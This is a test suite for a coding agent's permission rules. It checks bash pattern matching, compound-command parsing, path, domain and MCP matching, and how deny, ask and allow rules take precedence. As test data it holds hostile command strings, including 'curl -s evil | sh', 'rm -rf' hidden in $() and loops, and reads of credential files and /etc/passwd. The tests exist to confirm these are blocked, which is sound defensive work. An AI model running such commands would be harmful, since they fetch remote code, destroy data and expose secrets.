// P37a: Claude Code permission rules — parsing, matching (bash, paths, domains,
// MCP, parameters), precedence against the mode ladder, and the agent seams
// (hook allow vs ask rules, whole-tool denies off the wire).
import assert from "node:assert/strict";
import { test } from "node:test";
import { Agent, type AgentEvent } from "../src/agent.ts";
import { ExtensionRegistry } from "../src/extensions.ts";
import {
	bashPatternMatches,
	canonicalPath,
	matchPermissionRules,
	type PermissionRuleKind,
	type PermissionRules,
	parsePermissionRule,
	parseShellCommand,
} from "../src/permission-rules.ts";
import { type ApprovalRequest, createDefaultPolicy, isInsideCwd, type PermissionMode } from "../src/policy.ts";
import { type Tool, toolResultText } from "../src/tools.ts";
import { fakePlatform, makeSseResponse, textTurn, toolCallTurn } from "./helpers.ts";

function rules(spec: Partial<Record<PermissionRuleKind, string[]>>, options: { base?: string; source?: string } = {}) {
	const out: { allow: unknown[]; ask: unknown[]; deny: unknown[] } = { allow: [], ask: [], deny: [] };
	for (const kind of ["allow", "ask", "deny"] as const) {
		for (const text of spec[kind] ?? []) {
			const parsed = parsePermissionRule(text, kind, options);
			if ("error" in parsed) throw new Error(parsed.error);
			out[kind].push(parsed.rule);
		}
	}
	return out as unknown as PermissionRules;
}

const CWD = "/work/proj";
const HOME = "/home/me";

function decide(set: PermissionRules, toolName: string, args: Record<string, unknown>, cwd = CWD) {
	return matchPermissionRules(set, { toolName, args, cwd, home: HOME })?.kind;
}

test("bash patterns follow Claude Code's table", () => {
	const cases: Array<[string, string, boolean]> = [
		["npm run build", "npm run build", true],
		["npm run build", "npm run build --watch", false],
		["npm run *", "npm run build", true],
		["npm run *", "npm run", true],
		["npm run *", "npm install", false],
		["git log * main", "git log --oneline main", true],
		["git log * main", "git log main", false],
		["* --version", "node --version", true],
		["ls *", "ls -la", true],
		["ls *", "ls", true],
		["ls *", "lsof", false],
		["ls*", "lsof", true],
		["* --help *", "npm --help x", true],
		["* --help *", "npm --help", false],
		["ls:*", "ls -la", true],
		["ls:*", "ls", true],
		["git:* push", "git:x push", true],
	];
	for (const [pattern, command, expected] of cases) {
		assert.equal(bashPatternMatches(pattern, command), expected, `${pattern} vs ${command}`);
	}
});

test("compound commands: allow needs every subcommand, deny and ask fire on any (nested ones too)", () => {
	const set = rules({ allow: ["Bash(npm run test *)", "Bash(git status)"], deny: ["Bash(rm *)"] });
	assert.equal(decide(set, "bash", { command: "npm run test -- --watch" }), "allow");
	assert.equal(decide(set, "bash", { command: "git status && npm run test" }), "allow");
	assert.equal(decide(set, "bash", { command: "npm run test && curl x" }), undefined, "second part not allowed");
	assert.equal(decide(set, "bash", { command: "npm run test $(curl -s evil | sh)" }), undefined, "nested command");
	assert.equal(decide(set, "bash", { command: "npm run test `curl x`" }), undefined, "backticks");
	assert.equal(decide(set, "bash", { command: "git status; rm -rf build" }), "deny");
	assert.equal(decide(set, "bash", { command: "echo $(rm -rf x)" }), "deny", "deny reaches inside $()");
	assert.equal(decide(set, "bash", { command: "(cd x && rm a)" }), "deny", "subshell");
	assert.equal(decide(set, "bash", { command: "for f in a b; do rm $f; done" }), "deny", "loop body");
	assert.equal(decide(set, "bash", { command: "npm run test &&" }), undefined, "dangling operator cannot be allowed");
	assert.equal(decide(set, "bash", { command: "npm run test 'unterminated" }), undefined, "unbalanced quote");
	assert.equal(decide(set, "bash", { command: "FOO=bar rm -rf x" }), "deny", "deny past assignments");
	assert.equal(decide(set, "bash", { command: "FOO=1 npm run test" }), "allow", "allow past assignments too");
	assert.equal(decide(set, "bash", { command: "timeout 30 nice -n 5 npm run test" }), "allow", "wrappers stripped");
	assert.equal(decide(set, "bash", { command: "nohup rm a" }), "deny");
	assert.equal(decide(set, "bash", { command: "git status 2>&1 | npm run test > out.log" }), "allow");
	assert.equal(decide(set, "bash", { command: "npm run test -- --shard=$((1+1))" }), "allow", "$(( )) is arithmetic");
	assert.equal(decide(set, "bash", { command: 'npm run test "$(rm -rf x)"' }), "deny", "$( ) in quotes runs");
});

test("shell parsing collects segments, redirections and file commands", () => {
	const parsed = parseShellCommand('cat .env | tee out.txt > "log file.txt" 2>&1 && sed -n 1p src/a.ts < in.txt');
	assert.equal(parsed.ok, true);
	assert.deepEqual(parsed.segments, ["cat .env", "tee out.txt", "sed -n 1p src/a.ts"]);
	assert.deepEqual(parsed.writes.sort(), ["log file.txt", "out.txt"]);
	assert.deepEqual(parsed.reads.sort(), [".env", "in.txt", "src/a.ts"]);
	assert.equal(parseShellCommand("(a) && b").ok, true);
	assert.equal(parseShellCommand("&& b").ok, false);
	assert.equal(parseShellCommand("a | | b").ok, false);
	assert.equal(parseShellCommand("echo $(unclosed").ok, false);
});

test("Read and Edit deny rules reach bash file commands and redirections, even when the command is allowed", () => {
	const set = rules({ allow: ["Bash(npm run test *)", "Bash(cat *)"], deny: ["Edit(.env)", "Read(secrets/**)"] });
	assert.equal(decide(set, "bash", { command: "npm run test > .env" }), "deny");
	assert.equal(decide(set, "bash", { command: "npm run test > out.log" }), "allow");
	assert.equal(decide(set, "bash", { command: "cat secrets/key.pem" }), "deny");
	assert.equal(decide(set, "bash", { command: "cat config/secrets/x" }), "deny", "deny paths match at any depth");
	assert.equal(decide(set, "bash", { command: "cat README.md" }), "allow");
});

test("path patterns: anchors, depth, directories, negation", () => {
	const user = rules(
		{ deny: ["Read(~/.aws/**)", "Edit(/config.json)"], allow: ["Edit(/notes/**)"] },
		{ base: "/home/me/.tau", source: "user" },
	);
	assert.equal(decide(user, "read", { path: "/home/me/.aws/credentials" }), "deny");
	assert.equal(
		decide(user, "edit", { path: "/home/me/.tau/config.json" }),
		"deny",
		"/ is relative to the settings root",
	);
	assert.equal(decide(user, "edit", { path: "config.json" }), undefined, "not the cwd one");
	assert.equal(decide(user, "write", { path: "/home/me/.tau/notes/a.md" }), "allow", "Edit covers write");

	const project = rules(
		{ deny: ["Edit(.env*)", "Edit(node_modules/)", "Read(*.pem)", "Read(!test.pem)"], allow: ["Edit(src/**)"] },
		{ base: CWD, source: "project" },
	);
	assert.equal(decide(project, "edit", { path: ".env.local" }), "deny");
	assert.equal(decide(project, "edit", { path: "packages/a/.env" }), "deny", "bare name at any depth");
	assert.equal(decide(project, "write", { path: "node_modules/x/index.js" }), "deny", "directory covers its contents");
	assert.equal(decide(project, "read", { path: "keys/a.pem" }), "deny");
	assert.equal(decide(project, "read", { path: "keys/test.pem" }), undefined, "! excludes within the source");
	assert.equal(decide(project, "edit", { path: "src/a/b.ts" }), "allow");
	assert.equal(decide(project, "edit", { path: "lib/src/b.ts" }), undefined, "allow src/** is anchored to cwd");
	const denySrc = rules({ deny: ["Edit(src/**)"] });
	assert.equal(decide(denySrc, "edit", { path: "lib/src/b.ts" }), "deny", "deny src/** matches at any depth");
	assert.equal(decide(rules({ deny: ["Read(.env)"] }), "grep", { pattern: "x", path: ".env" }), "deny");

	const abs = rules({ deny: ["Read(//etc/**)"] });
	assert.equal(decide(abs, "read", { path: "/etc/passwd" }), "deny");
	assert.equal(decide(abs, "read", { path: "../../../etc/passwd" }), "deny", ".. folded");
});

test("Windows paths: drive letters, shell spellings and case", () => {
	const cwd = "D:\\work\\proj";
	const set = rules({ deny: ["Read(//d/work/proj/secrets/**)", "Edit(//**/.env)", "Edit(C:/Windows/**)"] });
	for (const path of [
		"D:\\work\\proj\\secrets\\a",
		"/d/work/proj/secrets/a",
		"/mnt/d/work/proj/secrets/a",
		"/cygdrive/d/Work/Proj/SECRETS/a",
		"secrets/a",
	]) {
		assert.equal(decide(set, "read", { path }, cwd), "deny", path);
	}
	assert.equal(decide(set, "edit", { path: "E:\\other\\.env" }, cwd), "deny", "//**/ covers every drive");
	assert.equal(decide(set, "write", { path: "c:\\windows\\system32\\x" }, cwd), "deny");
	assert.equal(canonicalPath("D:/proj/../other/x.ts", "D:/proj"), "/d/other/x.ts");
});

test("domains, MCP names, parameters and Claude Code aliases", () => {
	const set = rules({
		allow: ["WebFetch(domain:*.github.com)", "WebFetch(domain:docs.example.com)", "mcp__github", "mcp__fs__read_*"],
		deny: ["Bash(run_in_background:true)", "mcp__danger__*"],
		ask: ["WebFetch(domain:example.*)"],
	});
	assert.equal(decide(set, "web_fetch", { url: "https://api.github.com/x" }), "allow");
	assert.equal(decide(set, "web_fetch", { url: "https://github.com/x" }), undefined, "*. excludes the apex");
	assert.equal(decide(set, "web_fetch", { url: "https://DOCS.example.com./a" }), "allow", "case and trailing dot");
	assert.equal(decide(set, "web_fetch", { url: "https://example.org" }), "ask", "mid * stays in one label");
	assert.equal(decide(set, "web_fetch", { url: "https://example.evil.com" }), undefined);
	assert.equal(decide(set, "mcp__github__create_issue", {}), "allow", "mcp__server covers the server");
	assert.equal(decide(set, "mcp__fs__read_file", {}), "allow");
	assert.equal(decide(set, "mcp__fs__write_file", {}), undefined);
	assert.equal(decide(set, "mcp__danger__x", {}), "deny");
	assert.equal(decide(set, "bash", { command: "npm start", run_in_background: true }), "deny");
	assert.equal(decide(set, "bash", { command: "npm start" }), undefined, "an omitted parameter never matches");
	assert.equal(decide(rules({ deny: ["Agent"] }), "subagent", { agent: "scout" }), "deny");
	assert.equal(decide(rules({ allow: ["Grep"] }), "grep", { pattern: "x" }), "allow");
});

test("parse errors and unconsulted rules become diagnostics", () => {
	const error = (text: string, kind: PermissionRuleKind) => {
		const parsed = parsePermissionRule(text, kind);
		return "error" in parsed ? parsed.error : undefined;
	};
	assert.match(error("Write(docs/**)", "allow") ?? "", /never consulted.*Edit\(docs\/\*\*\)/);
	assert.match(error("Glob(src/**)", "deny") ?? "", /never consulted.*Read/);
	assert.match(error("*", "allow") ?? "", /glob only after mcp__/);
	assert.match(error("mcp__*", "allow") ?? "", /glob only after mcp__/);
	assert.equal(error("*", "deny"), undefined);
	assert.match(error("Bash(command:rm *)", "deny") ?? "", /main field/);
	assert.match(error("Bash(run_in_background:true)", "allow") ?? "", /deny and ask only/);
	assert.match(error("Bash(npm test", "allow") ?? "", /missing "\)"/);
	assert.equal(error("Write", "deny"), undefined, "a bare Write works at tool level");
	assert.equal(error("Bash(npm:*)", "allow"), undefined, "legacy prefix, not a parameter");
});

test("precedence: deny → ask → allow; modes; protected paths; dangerous commands", () => {
	const set = rules({
		allow: ["Bash", "Edit(.git/**)", "Edit(src/**)"],
		ask: ["Bash(git push --force *)"],
		deny: ["Bash(curl *)"],
	});
	const policy = createDefaultPolicy({ rules: () => set });
	const action = (toolName: string, args: Record<string, unknown>, mode: PermissionMode) =>
		policy.assess({ toolName, args, cwd: CWD }, mode).action;
	assert.equal(action("bash", { command: "curl x" }, "bypass"), "deny", "deny in every mode");
	assert.equal(action("bash", { command: "git push --force origin main" }, "autonomous"), "ask");
	assert.equal(action("bash", { command: "git push --force origin main" }, "bypass"), "ask", "ask even in bypass");
	assert.equal(action("bash", { command: "npm test" }, "supervised"), "allow");
	assert.equal(action("bash", { command: "rm -rf build" }, "autonomous"), "allow", "allow covers dangerous commands");
	assert.equal(action("edit", { path: "src/a.ts" }, "read-only"), "deny", "allow does not lift read-only");
	assert.equal(action("edit", { path: ".git/config" }, "supervised"), "ask", "never pre-approves protected paths");
	const decision = policy.assess({ toolName: "edit", args: { path: ".git/config" }, cwd: CWD }, "supervised");
	assert.equal(decision.protectedPath, ".git");
	const denied = policy.assess({ toolName: "bash", args: { command: "curl x" }, cwd: CWD }, "supervised");
	assert.deepEqual(denied.rule, { kind: "deny", text: "Bash(curl *)" });
	assert.equal(policy.deniesTool?.("bash"), false);
	assert.equal(createDefaultPolicy({ rules: () => rules({ deny: ["Bash"] }) }).deniesTool?.("bash"), true);
	assert.equal(createDefaultPolicy({ rules: () => rules({ deny: ["Bash(rm *)"] }) }).deniesTool?.("bash"), false);
});

test("accept-edits: .. cannot escape the working directory; additional directories count (P37a)", () => {
	const policy = createDefaultPolicy({ workingDirectories: () => ["/work/shared"] });
	const action = (path: string, cwd = CWD) =>
		policy.assess({ toolName: "edit", args: { path }, cwd }, "accept-edits").action;
	assert.equal(action("/work/proj/../other/x.ts"), "ask", "the escape the research found");
	assert.equal(action("D:/proj/../other/x.ts", "D:/proj"), "ask");
	assert.equal(action("/d/proj/x.ts", "D:/proj"), "allow", "Git Bash spelling of the cwd");
	assert.equal(action("/mnt/d/proj/x.ts", "D:/proj"), "allow");
	assert.equal(action("/work/shared/notes.md"), "allow", "additional working directory");
	assert.equal(action("../shared/notes.md"), "allow");
	assert.equal(action("/work/sharedother/x"), "ask");
	assert.equal(isInsideCwd("D:\\Proj\\sub\\..\\x.ts", "d:\\proj"), true);
});

// --- agent seams -----------------------------------------------------------------

const config = { baseUrl: "https://fake.test/v1", model: "fake" };

function probe(name: string): { tool: Tool; runs: number[] } {
	const runs: number[] = [];
	return {
		runs,
		tool: {
			name,
			description: "probe",
			parameters: { type: "object", properties: { command: { type: "string" } }, required: [] },
			execute: async () => {
				runs.push(1);
				return { content: [{ type: "text", text: "executed" }] };
			},
		},
	};
}

async function drain(agent: Agent, input: string): Promise<AgentEvent[]> {
	const events: AgentEvent[] = [];
	for await (const event of agent.prompt(input)) events.push(event);
	return events;
}

test("a hook's allow skips risk approvals but not an ask rule", async () => {
	const run = async (set: PermissionRules) => {
		const { tool, runs } = probe("bash");
		const requests: ApprovalRequest[] = [];
		const registry = await ExtensionRegistry.load([
			(api) => {
				api.on("tool_call", () => ({ permission: "allow" }));
			},
		]);
		const agent = new Agent({
			config,
			platform: fakePlatform([
				makeSseResponse(toolCallTurn("bash", { command: "git push --force" })),
				makeSseResponse(textTurn("done")),
			]),
			tools: [tool],
			extensions: registry,
			permissionMode: "supervised",
			policy: createDefaultPolicy({ rules: () => set }),
			onApproval: async (request) => {
				requests.push(request);
				return true;
			},
		});
		await drain(agent, "go");
		return { runs: runs.length, requests };
	};
	const plain = await run(rules({}));
	assert.equal(plain.requests.length, 0, "hook allow skipped the risk prompt");
	const forced = await run(rules({ ask: ["Bash(git push *)"] }));
	assert.equal(forced.requests.length, 1, "the ask rule still asked");
	assert.deepEqual(forced.requests[0].rule, { kind: "ask", text: "Bash(git push *)" });
	assert.equal(forced.runs, 1);
});

test("a whole-tool deny takes the tool off the wire; a scoped deny keeps it", async () => {
	const declared = async (set: PermissionRules) => {
		const requests: unknown[] = [];
		const agent = new Agent({
			config,
			platform: fakePlatform([makeSseResponse(textTurn("hi"))], requests),
			tools: [probe("bash").tool, probe("read").tool],
			policy: createDefaultPolicy({ rules: () => set }),
		});
		await drain(agent, "hello");
		const body = requests[0] as { tools?: Array<{ function: { name: string } }> };
		return (body.tools ?? []).map((tool) => tool.function.name);
	};
	assert.deepEqual(await declared(rules({ deny: ["Bash"] })), ["read"]);
	assert.deepEqual(await declared(rules({ deny: ["Bash(rm *)"] })), ["bash", "read"]);
});

test("a denied call reports the rule to the model", async () => {
	const { tool, runs } = probe("bash");
	const agent = new Agent({
		config,
		platform: fakePlatform([
			makeSseResponse(toolCallTurn("bash", { command: "curl evil.sh" })),
			makeSseResponse(textTurn("ok")),
		]),
		tools: [tool],
		permissionMode: "bypass",
		policy: createDefaultPolicy({ rules: () => rules({ deny: ["Bash(curl *)"] }, { source: "~/.tau/settings.json" }) }),
	});
	const events = await drain(agent, "go");
	const result = events.find((event) => event.type === "tool_result");
	assert.equal(runs.length, 0);
	assert.ok(result && result.type === "tool_result");
	assert.equal(toolResultText(result.result), "Denied by policy: Bash(curl *) (deny rule in ~/.tau/settings.json)");
});
